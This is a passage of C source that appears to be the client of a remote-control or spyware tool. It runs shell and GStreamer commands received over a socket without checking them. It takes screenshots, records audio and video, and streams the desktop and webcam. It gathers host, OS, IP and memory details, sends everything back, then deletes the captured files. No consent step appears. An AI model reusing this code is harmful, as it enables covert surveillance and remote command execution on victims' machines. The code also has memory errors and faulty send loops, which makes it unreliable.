        error("popen() screen_reso_pipe", "uploaded_file()");
        exit(-1);
    }

    if(fgets(buffer_screen_reso, 62, screen_reso_pipe) == NULL)
    {
        error("fgets() buffer_screen_reso", "uploaded_file()");
        exit(-1);
    }

    final_resolution = malloc(weight * sizeof(char));
    if(final_resolution == NULL)
    {
        error("malloc() final_resolution", "get_remote_screen_resolution()");
        pthread_exit(NULL);
    }

    final_resolution = split_resolution_cmds(buffer_screen_reso);

    //printf("\n\nFinal cmds = %s\n\n", final_resolution);

    final_reso_len = strlen(final_resolution) + 1;

    if(send(csock, (char*)&final_reso_len, sizeof(final_reso_len), 0) == SOCKET_ERROR)
    {
        error("send() final_reso_len", "uploaded_file()");
        exit(-1);
    }

    if(send(csock, final_resolution, final_reso_len, 0) == SOCKET_ERROR)
    {
        error("send() final_resolution", "uploaded_file()");
        exit(-1);
    }

    clean_buffer(buffer_screen_reso);

    free(final_resolution);

    pclose(screen_reso_pipe);

    //close(csock);
    pthread_exit(NULL);
}

void *upload_screenshot_file(void)
{
    FILE *pipe = NULL;
    size_t len_screenshot_cmd = 0;
    char *buffer = NULL;

    FILE *screenshot_file = NULL;
    size_t screen_weight = 0;

    char buffer_desktop_screenshot[1450] = "";
    long dataSend = 0;
    size_t dataRead = 0;
    size_t totalSend = 0;

    if(recv(csock, (char*)&len_screenshot_cmd, sizeof(len_screenshot_cmd), 0) == SOCKET_ERROR)
    {
        error("recv() len_screenshot_cmd", "upload_screenshot_file()");
        exit(-1);
    }

    buffer = malloc(len_screenshot_cmd * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc() buffer", "upload_screenshot_file()");
        exit(-1);
    }

    if(recv(csock, buffer, len_screenshot_cmd, 0) == SOCKET_ERROR)
    {
        error("recv() buffer", "upload_screenshot_file()");
        exit(-1);
    }

    printf("\n\nCommand ---> %s\n\n", buffer);

    pipe = popen(buffer, "r");
    if(pipe == NULL)
    {
        error("popen() pipe", "upload_screenshot_file()");
        exit(-1);
    }

    wait_time_end(5);

    screenshot_file = fopen("screenshot.jpeg", "rb");
    if(screenshot_file == NULL)
    {
        error("fopen() screenshot_file", "upload_screenshot_file()");
        exit(-1);
    }

    /* weight of record file */
    fseek(screenshot_file, 0, SEEK_END);
    screen_weight = (size_t)ftell(screenshot_file);
    rewind(screenshot_file);

    printf("le fichier screenshot fait : %ld octets\n", screen_weight);

    if(send(csock, (char*)&screen_weight, sizeof(screen_weight), 0) == SOCKET_ERROR)
    {
        error("send() screen_weight", "upload_screenshot_file()");
        exit(-1);
    }

    printf("\n\nscreen weight = %ld\n\n", screen_weight);

    do
    {
        dataRead = fread(buffer_desktop_screenshot, sizeof(char), sizeof(screen_weight), screenshot_file);

        dataSend = send(csock, buffer_desktop_screenshot, sizeof(screen_weight), 0);
        if(dataSend == 0)
        {
            error("send() datasend", "upload_screenshot_file()");
            exit(-1);
        }

        totalSend += dataRead;

    }while(totalSend < screen_weight);

    printf("\n\nEnvoie du screenshot SUCCESS !!\n");

    if(system("rm -rf screenshot.jpeg") == -1)
    {
        error("system() delete screenshot.jpeg", "upload_screenshot_file()");
        exit(-1);
    }

    fclose(screenshot_file);
    close(csock);

    free(buffer);

    if(pclose(pipe) == -1)
    {
        printf("Fail to close pipe!\n");
        exit(-1);
    }

    pthread_exit(NULL);
}

void *upload_multi_screenshot_files(void)
{
    FILE *pipe = NULL;
    size_t len_screenshot_cmd = 0;
    char *buffer = NULL;

    FILE *screenshot_file = NULL;
    size_t screen_weight = 0;

    gchar *file_name = NULL;
    size_t i = 1;
    size_t j = 0;

    unsigned int total_number_of_screenshot = 0;
    int delay_interval = 0;

    char *buffer_desktop_screenshot = NULL;
    long dataSend = 0;
    size_t dataRead = 0;
    size_t totalSend = 0;

    char *erase_cmds = NULL;


    if(recv(csock, (char*)&total_number_of_screenshot, sizeof(total_number_of_screenshot), 0) == SOCKET_ERROR)
    {
        error("recv() total_number_of_screenshot", "upload_multi_screenshot_files()");
        exit(-1);
    }

     if(recv(csock, (char*)&delay_interval, sizeof(delay_interval), 0) == SOCKET_ERROR)
    {
        error("recv() delay_interval", "upload_multi_screenshot_files()");
        exit(-1);
    }

    printf("\n\n\ntotal screenshot = %d\n", total_number_of_screenshot);

    printf("DELAY INTERVAL = %d\n\n", delay_interval);

    if(recv(csock, (char*)&len_screenshot_cmd, sizeof(len_screenshot_cmd), 0) == SOCKET_ERROR)
    {
        error("recv() len_screenshot_cmd", "upload_multi_screenshot_files()");
        exit(-1);
    }

    buffer = malloc(len_screenshot_cmd * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc() buffer", "upload_multi_screenshot_files()");
        exit(-1);
    }

    if(recv(csock, buffer, len_screenshot_cmd, 0) == SOCKET_ERROR)
    {
        error("recv() buffer", "upload_multi_screenshot_files()");
        exit(-1);
    }

    printf("\n\ncommand ---> %s\n\n\n", buffer);

    pipe = popen(buffer, "r");
    if(pipe == NULL)
    {
        error("popen() pipe", "upload_multi_screenshot_files()");
        exit(-1);
    }

    free(buffer);

    //sleep((unsigned int)delay_interval + 5);

    wait_time_end(delay_interval+5);

    do
    {
        file_name = malloc(total_number_of_screenshot * sizeof(gchar));
        if(file_name == NULL)
        {
            error("malloc() file_name", "upload_multi_screenshot_files()");
            exit(-1);
        }

        snprintf(file_name, 1200, "%ld.jpeg", i);

        printf("\nfilename = %s\n", file_name);

        screenshot_file = fopen(file_name, "rb");
        if(screenshot_file == NULL)
        {
            error("fopen() file_name", "upload_multi_screenshot_files()");
            exit(-1);
        }

        printf("\n\n\n------------->filename = %ld.jpeg\n\n\n", i);

        /* weight of screenshot file */
        fseek(screenshot_file, 0, SEEK_END);
        screen_weight = (size_t)ftell(screenshot_file);
        rewind(screenshot_file);


        printf("\n\nle fichier screenshot fait : %ld octets\n\n", screen_weight);

        if(send(csock, (char*)&screen_weight, sizeof(screen_weight), 0) == SOCKET_ERROR)
        {
            error("send() screen_weight", "upload_multi_screenshot_files()");
            exit(-1);
        }

        buffer_desktop_screenshot = malloc(screen_weight * (sizeof(char)));
        if(buffer_desktop_screenshot == NULL)
        {
            error("malloc() buffer_desktop_screenshot", "upload_multi_screenshot_files()");
            exit(-1);
        }

        do
        {
            dataRead = fread(buffer_desktop_screenshot, sizeof(char), sizeof(screen_weight), screenshot_file);
            if(dataRead == 0)
            {
                error("send() dataRead", "upload_multi_screenshot_files()");
                exit(-1);
            }

            dataSend = send(csock, buffer_desktop_screenshot, sizeof(screen_weight), 0);
            if(dataSend == 0)
            {
                error("send() datasend", "upload_multi_screenshot_files()");
                exit(-1);
            }

            totalSend += dataRead;

        }while(totalSend < screen_weight);

        printf("\nEnvoie du screenshot SUCCESS !!\n");

        totalSend = 0;
        screen_weight = 0;
        dataRead = 0;

        free(buffer_desktop_screenshot);

        erase_cmds = malloc(14 * sizeof(gchar));
        if(erase_cmds == NULL)
        {
            error("malloc() erase_cmds", "upload_multi_screenshot_files()");
            exit(-1);
        }

        erase_cmds = strncpy(erase_cmds, "rm -rf ", 8);
        erase_cmds = strcat(erase_cmds, file_name);

        if(system(erase_cmds) == -1)
        {
            error("system() delete multi_screenshot.jpeg", "upload_multi_screenshot_files()");
            exit(-1);
        }

        fclose(screenshot_file);

        usleep(500);

        free(file_name);
        free(erase_cmds);

        i++;
        j++;

    }while(i <= total_number_of_screenshot);

    if(pclose(pipe) == -1)
    {
        printf("Fail to close pipe!\n");
        exit(-1);
    }

    close(csock);

    pthread_exit(NULL);
}

void *execute_record_cmd(void)
{
    size_t len_record_cmd = 0;
    char *buffer = NULL;

    GstElement *pipeline;
    GstBus *bus;
    GstStateChangeReturn ret;
    GMainLoop *main_loop;
    CustomData data;

    int recorded = 0;

    //FILE *pipe = NULL;

    FILE *record_file = NULL;
    long file_weight = 0;

    char *buffer_record = NULL;
    long dataSend = 0;
    long dataRead = 0;
    long totalSend = 0;

    const char *sound_cmd = "rm -rf output.wav";
    FILE *pipe_delete_sound_file = NULL;

    const char *compress_sound_cmd = "rm -rf output.mp3";
    FILE *pipe_delete_compress_sound_file = NULL;

    const char *video_cmd = "rm -rf output.avi";
    FILE *pipe_delete_video_file = NULL;

    if(recv(csock, (char*)&len_record_cmd, sizeof(len_record_cmd), 0) == SOCKET_ERROR)
    {
        error("recv() len_record_cmd", "execute_record_cmd()");
        pthread_exit(NULL);
    }

    buffer = malloc(len_record_cmd * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc() buffer", "execute_record_cmd()");
        pthread_exit(NULL);
    }

    if(recv(csock, buffer, len_record_cmd, 0) == SOCKET_ERROR)
    {
        error("recv() buffer", "execute_record_cmd()");
        pthread_exit(NULL);
    }

    //pipe = popen(buffer, "r");

    memset (&data, 0, sizeof (data));

    pipeline = gst_parse_launch(buffer, NULL);
    bus = gst_element_get_bus (pipeline);

    ret = gst_element_set_state (pipeline, GST_STATE_PLAYING);

    if(ret == GST_STATE_CHANGE_FAILURE)
    {
        g_printerr ("Unable to set the pipeline to the playing state.\n");
        gst_object_unref(pipeline);
        pthread_exit(NULL);
    }

    else if(ret == GST_STATE_CHANGE_NO_PREROLL)
    {
        data.is_live = TRUE;
    }

    main_loop = g_main_loop_new (NULL, FALSE);
    data.loop = main_loop;
    data.pipeline = pipeline;

    gst_bus_add_signal_watch(bus);
    g_signal_connect(bus, "message", G_CALLBACK(cb_message), &data);

    g_main_loop_run(main_loop);

    g_main_loop_unref (main_loop);
    gst_object_unref(bus);

    if(on_video == 1)
        gst_element_set_state (pipeline, GST_STATE_NULL);
    else
        gst_element_set_state (pipeline, GST_STATE_PLAYING);

    gst_object_unref(pipeline);

    free(buffer);

    recorded = 1;

    if(on_video == 1)
    {
        record_file = fopen("output.avi", "rb");
        if(record_file == NULL)
        {
            error("fopen() output.avi", "execute_record_cmd()");
            pthread_exit(NULL);
        }
    }

    if(on_video == 0)
    {
        if(send(csock, (char*)&recorded, sizeof(recorded), 0) == -1)
            error("send() recorded", "execute_record_cmd()");

        if(system("ffmpeg -i output.wav -vn -ar 44100 -ac 2 -b:a 320k output.mp3") == -1)
        {
            error("system convert to mp3", "execute_record_cmd()");
            pthread_exit(NULL);
        }

        wait_time_end(1.0);

        record_file = fopen("output.mp3", "rb");
        if(record_file == NULL)
        {
            error("fopen() output.mp3", "execute_record_cmd()");
            pthread_exit(NULL);
        }
    }

    /* weight of recorded file */
    fseek(record_file, 0, SEEK_END);
    file_weight = ftell(record_file);
    rewind(record_file);

    buffer_record = malloc(file_weight * sizeof(char));
    if(buffer_record == NULL)
    {
        error("malloc buffer_record", "execute_record_cmd()");
        pthread_exit(NULL);
    }

    if(send(csock, (char*)&file_weight, sizeof(file_weight), 0) == SOCKET_ERROR)
    {
        error("send() video weight", "execute_record_cmd()");
        pthread_exit(NULL);
    }

    printf("\n\nFile_weight = %ld\n\n", file_weight);

    do
    {
        dataRead = fread(buffer_record, sizeof(char), sizeof(file_weight), record_file);
        if(dataRead < 0)
        {
            error("send() dataRead", "execute_record_cmd()");
            pthread_exit(NULL);
        }

        dataSend = send(csock, buffer_record, sizeof(file_weight), 0);
        if(dataSend == 0)
        {
            error("send() datasend", "execute_record_cmd()");
            pthread_exit(NULL);
        }

        totalSend += dataRead;

    }while(totalSend < file_weight);

    printf("\n\nEnvoie du fichier SUCCESS : %ld !!\n", totalSend);

    wait_time_end(1.5);

    if(on_video == 1)
    {
        pipe_delete_video_file = popen(video_cmd, "r");
        if(pipe_delete_video_file == NULL)
        {
            error("popen() delete output.avi", "execute_record_cmd()");
            pthread_exit(NULL);
        }
    }

    if(on_video == 0)
    {
        pipe_delete_sound_file = popen(sound_cmd, "r");
        if(pipe_delete_sound_file == NULL)
        {
            error("popen() delete output.wav", "execute_record_cmd()");
            pthread_exit(NULL);
        }

        pipe_delete_compress_sound_file = popen(compress_sound_cmd, "r");
        if(pipe_delete_compress_sound_file == NULL)
        {
            error("popen() delete output.mp3", "execute_record_cmd()");
            pthread_exit(NULL);
        }
    }

    if(on_video == 1)
    {
        if(pclose(pipe_delete_video_file) == -1)
        {
            printf("Fail to close pipe_delete_file!\n");
            pthread_exit(NULL);
        }
    }

    else
    {
        if(pclose(pipe_delete_sound_file) == -1)
        {
            printf("Fail to close pipe_delete_sound_file!\n");
            pthread_exit(NULL);
        }

        if(pclose(pipe_delete_compress_sound_file) == -1)
        {
            printf("Fail to close pipe_delete_compress_sound_file!\n");
            pthread_exit(NULL);
        }
    }

    free(buffer_record);
    fclose(record_file);
    pthread_exit(NULL);
}

void *stream_desktop(void)
{
    size_t len_watch_cmd = 0;
    char *buffer = NULL;

    GstElement *pipeline;
    GstBus *bus;
    GstStateChangeReturn ret;
    GMainLoop *main_loop;
    CustomData data;

    if(recv(csock, (char*)&len_watch_cmd, sizeof(len_watch_cmd), 0) == SOCKET_ERROR)
    {
        error("recv() len_watch_cmd", "execute_watch_cmd()");
        exit(-1);
    }

    buffer = malloc(len_watch_cmd * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc() buffer", "execute_watch_cmd()");
        exit(-1);
    }

    if(recv(csock, buffer, len_watch_cmd, 0) == SOCKET_ERROR)
    {
        error("recv() buffer", "execute_watch_cmd()");
        exit(-1);
    }

     /* Initialize our data structure */
    memset (&data, 0, sizeof (data));

    /* Build the pipeline */
    pipeline = gst_parse_launch(buffer, NULL);
    bus = gst_element_get_bus (pipeline);

    /* Start playing */
    ret = gst_element_set_state (pipeline, GST_STATE_PLAYING);

    if(ret == GST_STATE_CHANGE_FAILURE)
    {
        g_printerr ("Unable to set the pipeline to the playing state.\n");
        gst_object_unref (pipeline);
        exit(-1);
    }

    else if(ret == GST_STATE_CHANGE_NO_PREROLL)
    {
        data.is_live = TRUE;
    }

    main_loop = g_main_loop_new (NULL, FALSE);
    data.loop = main_loop;
    data.pipeline = pipeline;

    gst_bus_add_signal_watch (bus);
    g_signal_connect(bus, "message", G_CALLBACK(cb_message), &data);

    pthread_exit(NULL);

    g_main_loop_run(main_loop);

    /* Free resources */
    g_main_loop_unref (main_loop);
    gst_object_unref (bus);
    gst_element_set_state (pipeline, GST_STATE_NULL);
    gst_object_unref (pipeline);

    free(buffer);

    close(csock);

    pthread_exit(NULL);
}

void stream_webcam(void)
{
    size_t len_watch_cmd = 0;
    char *buffer = NULL;

    GstElement *pipeline;
    GstBus *bus;
    GstStateChangeReturn ret;
    GMainLoop *main_loop;
    CustomData data;

    if(recv(csock, (char*)&len_watch_cmd, sizeof(len_watch_cmd), 0) == SOCKET_ERROR)
    {
        error("recv() len_watch_cmd", "execute_watch_cmd()");
        exit(-1);
    }

    buffer = malloc(len_watch_cmd * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc() buffer", "execute_watch_cmd()");
        exit(-1);
    }

    if(recv(csock, buffer, len_watch_cmd, 0) == SOCKET_ERROR)
    {
        error("recv() buffer", "execute_watch_cmd()");
        exit(-1);
    }

     /* Initialize our data structure */
    memset (&data, 0, sizeof (data));

    /* Build the pipeline */
    pipeline = gst_parse_launch(buffer, NULL);
    bus = gst_element_get_bus (pipeline);

    /* Start playing */
    ret = gst_element_set_state (pipeline, GST_STATE_PLAYING);

    if(ret == GST_STATE_CHANGE_FAILURE)
    {
        g_printerr ("Unable to set the pipeline to the playing state.\n");
        gst_object_unref (pipeline);
        exit(-1);
    }

    else if(ret == GST_STATE_CHANGE_NO_PREROLL)
    {
        data.is_live = TRUE;
    }

    main_loop = g_main_loop_new (NULL, FALSE);
    data.loop = main_loop;
    data.pipeline = pipeline;

    gst_bus_add_signal_watch (bus);
    g_signal_connect(bus, "message", G_CALLBACK(cb_message), &data);

    pthread_exit(NULL);

    g_main_loop_run(main_loop);

    /* Free resources */
    g_main_loop_unref (main_loop);
    gst_object_unref (bus);
    gst_element_set_state (pipeline, GST_STATE_NULL);
    gst_object_unref (pipeline);

    free(buffer);

    close(csock);

    pthread_exit(NULL);
}

void cb_message(GstBus *bus, GstMessage *msg, CustomData *data)
{
    switch (GST_MESSAGE_TYPE (msg))
    {
        case GST_MESSAGE_ERROR:
        {
            GError *err;
            gchar *debug;

            gst_message_parse_error (msg, &err, &debug);
            g_print ("Error: %s\n", err->message);
            g_error_free (err);
            g_free (debug);

            gst_element_set_state (data->pipeline, GST_STATE_READY);
            g_main_loop_quit (data->loop);
            break;
        }

        case GST_MESSAGE_EOS:
            /* end-of-stream */
            gst_element_set_state (data->pipeline, GST_STATE_NULL);
            g_main_loop_quit (data->loop);
            break;

        case GST_MESSAGE_BUFFERING:
        {
            gint percent = 0;

            /* If the stream is live, we do not care about buffering. */
            if (data->is_live) break;

            gst_message_parse_buffering (msg, &percent);
            g_print ("Buffering (%3d%%)\r", percent);

            /* Wait until buffering is complete before start/resume playing */
            if (percent < 100)
                gst_element_set_state (data->pipeline, GST_STATE_PAUSED);

            else
                gst_element_set_state (data->pipeline, GST_STATE_PLAYING);

            break;
        }

        case GST_MESSAGE_CLOCK_LOST:

            /* Get a new clock */
            gst_element_set_state (data->pipeline, GST_STATE_PAUSED);
            gst_element_set_state (data->pipeline, GST_STATE_PLAYING);
            break;

        default:
            /* Unhandled message */
            break;
    }

    // unsed parameters
    (void)bus;

    return;
}

void *gather_infos(void)
{
    size_t len_infos_cmd = 0;

    char *buffer = NULL;
    char *buffer_architecture = NULL;
    char *buffer_os = NULL;
    char *buffer_ip = NULL;
    char *buffer_memory = NULL;

    char hostname_cmd_ouput[256];
    char architecture_cmd_ouput[256];
    char os_cmd_ouput[256];
    char ip_cmd_ouput[256];
    char memory_cmd_ouput[256];

    FILE *pipe;
    FILE *pipe_architecture;
    FILE *pipe_os;
    FILE *pipe_ip;
    FILE *pipe_memory;

    int ret = 0;

    /** Hostname **/
    if(recv(csock, (char*)&len_infos_cmd, sizeof(len_infos_cmd), 0) == SOCKET_ERROR)
    {
        error("recv() len_watch_cmd", "gather_infos()");
        pthread_exit(NULL);
    }

    buffer = malloc(len_infos_cmd * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc() buffer", "gather_infos()");
        pthread_exit(NULL);
    }

    if(recv(csock, buffer, len_infos_cmd, 0) == SOCKET_ERROR)
    {
        error("recv() buffer", "gather_infos()");
        pthread_exit(NULL);
    }

    printf("\nbuffer = %s\n", buffer);

    pipe = popen(buffer, "r");
    if(pipe == NULL)
    {
        error("popen() buffer", "gather_infos()");
        pthread_exit(NULL);
    }

    if(fgets(hostname_cmd_ouput, 256, pipe) == NULL)
    {
        error("fgets() cmd_infos_ouput pipe", "gather_infos()");
        pthread_exit(NULL);
    }

    buffer[strlen(hostname_cmd_ouput) - 1] = 0;

    printf("\ncmd_output : %s\n", hostname_cmd_ouput);

    ret = fread(hostname_cmd_ouput, BUFSIZ, sizeof(char), pipe);
    if(ret < 0)
    {
        error("fread() buffer_cmd", "gather_infos()");
        pthread_exit(NULL);
    }

    if(send(csock, hostname_cmd_ouput, MAXDATASIZE, 0) == SOCKET_ERROR)
    {
        error("send() buffer_cmd", "gather_infos()");
        pthread_exit(NULL);
    }

    /** Architecture **/
    if(recv(csock, (char*)&len_infos_cmd, sizeof(len_infos_cmd), 0) == SOCKET_ERROR)
    {
        error("recv() len_watch_cmd", "gather_infos()");
        pthread_exit(NULL);
    }

    buffer_architecture = malloc(len_infos_cmd * sizeof(char));
    if(buffer_architecture == NULL)
    {
        error("malloc() buffer_architecture", "gather_infos()");
        pthread_exit(NULL);
    }

    if(recv(csock, buffer_architecture, len_infos_cmd, 0) == SOCKET_ERROR)
    {
        error("recv() buffer_architecture", "gather_infos()");
        pthread_exit(NULL);
    }

    printf("\nbuffer = %s\n", buffer_architecture);

    pipe_architecture = popen(buffer_architecture, "r");
    if(pipe_architecture == NULL)
    {
        error("popen() buffer_architecture", "gather_infos()");
        pthread_exit(NULL);
    }

    if(fgets(architecture_cmd_ouput, 256, pipe_architecture) == NULL)
    {
        error("fgets() architecture_cmd_ouput pipe", "gather_infos()");
        pthread_exit(NULL);
    }

    buffer_architecture[strlen(architecture_cmd_ouput) - 1] = 0;

    printf("\ncmd_output : %s\n", architecture_cmd_ouput);

    ret = fread(architecture_cmd_ouput, BUFSIZ, sizeof(char), pipe_architecture);
    if(ret < 0)
    {
        error("fread() buffer_cmd", "gather_infos()");
        pthread_exit(NULL);
    }

    if(send(csock, architecture_cmd_ouput, MAXDATASIZE, 0) == SOCKET_ERROR)
    {
        error("send() architecture_cmd_ouput", "gather_infos()");
        pthread_exit(NULL);
    }

    /** Operating System**/
    if(recv(csock, (char*)&len_infos_cmd, sizeof(len_infos_cmd), 0) == SOCKET_ERROR)
    {
        error("recv() len_watch_cmd", "gather_infos()");
        pthread_exit(NULL);
    }

    buffer_os = malloc(len_infos_cmd * sizeof(char));
    if(buffer_os == NULL)
    {
        error("malloc() buffer_os", "gather_infos()");
        pthread_exit(NULL);
    }

    if(recv(csock, buffer_os, len_infos_cmd, 0) == SOCKET_ERROR)
    {
        error("recv() buffer_architecture", "gather_infos()");
        pthread_exit(NULL);
    }

    printf("\nbuffer = %s\n", buffer_os);

    pipe_os = popen(buffer_os, "r");
    if(pipe_os == NULL)
    {
        error("popen() buffer_os", "gather_infos()");
        pthread_exit(NULL);
    }

    if(fgets(os_cmd_ouput, 256, pipe_os) == NULL)
    {
        error("fgets() os_cmd_ouput pipe", "gather_infos()");
        pthread_exit(NULL);
    }

    //buffer_os[strlen(os_cmd_ouput) - 1] = 0;

    printf("\ncmd_output : %s\n", os_cmd_ouput);

    ret = fread(os_cmd_ouput, BUFSIZ, sizeof(char), pipe_os);
    if(ret < 0)
    {
        error("fread() os_cmd_ouput", "gather_infos()");
        pthread_exit(NULL);
    }

    if(send(csock, os_cmd_ouput, MAXDATASIZE, 0) == SOCKET_ERROR)
    {
        error("send() os_cmd_ouput", "gather_infos()");
        pthread_exit(NULL);
    }

    /** IP **/
    if(recv(csock, (char*)&len_infos_cmd, sizeof(len_infos_cmd), 0) == SOCKET_ERROR)
    {
        error("recv() len_watch_cmd", "gather_infos()");
        pthread_exit(NULL);
    }

    buffer_ip = malloc(len_infos_cmd * sizeof(char));
    if(buffer_os == NULL)
    {
        error("malloc() buffer_ip", "gather_infos()");
        pthread_exit(NULL);
    }

    if(recv(csock, buffer_ip, len_infos_cmd, 0) == SOCKET_ERROR)
    {
        error("recv() buffer_ip", "gather_infos()");
        pthread_exit(NULL);
    }

    printf("\nbuffer = %s\n", buffer_ip);

    pipe_ip = popen(buffer_ip, "r");
    if(pipe_ip == NULL)
    {
        error("popen() buffer_ip", "gather_infos()");
        pthread_exit(NULL);
    }

    if(fgets(ip_cmd_ouput, 256, pipe_ip) == NULL)
    {
        error("fgets() ip_cmd_ouput pipe", "gather_infos()");
        pthread_exit(NULL);
    }

    buffer_ip[strlen(ip_cmd_ouput) - 1] = 0;

    printf("\ncmd_output : %s\n", ip_cmd_ouput);

    ret = fread(ip_cmd_ouput, BUFSIZ, sizeof(char), pipe_ip);
    if(ret < 0)
    {
        error("fread() ip_cmd_ouput", "gather_infos()");
        pthread_exit(NULL);
    }

    if(send(csock, ip_cmd_ouput, MAXDATASIZE, 0) == SOCKET_ERROR)
    {
        error("send() ip_cmd_ouput", "gather_infos()");
        pthread_exit(NULL);
    }

    /** Memory **/
    if(recv(csock, (char*)&len_infos_cmd, sizeof(len_infos_cmd), 0) == SOCKET_ERROR)
    {
        error("recv() len_watch_cmd", "gather_infos()");
        pthread_exit(NULL);
    }

    buffer_memory = malloc(len_infos_cmd * sizeof(char));
    if(buffer_memory == NULL)
    {
        error("malloc() buffer_memory", "gather_infos()");
        pthread_exit(NULL);
    }

    if(recv(csock, buffer_memory, len_infos_cmd, 0) == SOCKET_ERROR)
    {
        error("recv() buffer_architecture", "gather_infos()");
        pthread_exit(NULL);
    }

    printf("\nbuffer = %s\n", buffer_memory);

    pipe_memory = popen(buffer_memory, "r");
    if(pipe_memory == NULL)
    {
        error("popen() buffer_memory", "gather_infos()");
        pthread_exit(NULL);
    }

    if(fgets(memory_cmd_ouput, 256, pipe_memory) == NULL)
    {
        error("fgets() os_cmd_ouput pipe", "gather_infos()");
        pthread_exit(NULL);
    }

    buffer_memory[strlen(memory_cmd_ouput) - 1] = 0;

    printf("\ncmd_output : %s\n", memory_cmd_ouput);

    ret = fread(memory_cmd_ouput, BUFSIZ, sizeof(char), pipe_memory);
    if(ret < 0)
    {
        error("fread() os_cmd_ouput", "gather_infos()");
        pthread_exit(NULL);
    }

    if(send(csock, memory_cmd_ouput, MAXDATASIZE, 0) == SOCKET_ERROR)
    {
        error("send() memory_cmd_ouput", "gather_infos()");
        pthread_exit(NULL);
    }

    pclose(pipe);
    pclose(pipe_architecture);
    pclose(pipe_os);
    pclose(pipe_ip);
    pclose(pipe_memory);

    free(buffer);
    free(buffer_architecture);
    free(buffer_os);
    free(buffer_ip);
    free(buffer_memory);


    pthread_exit(NULL);
}
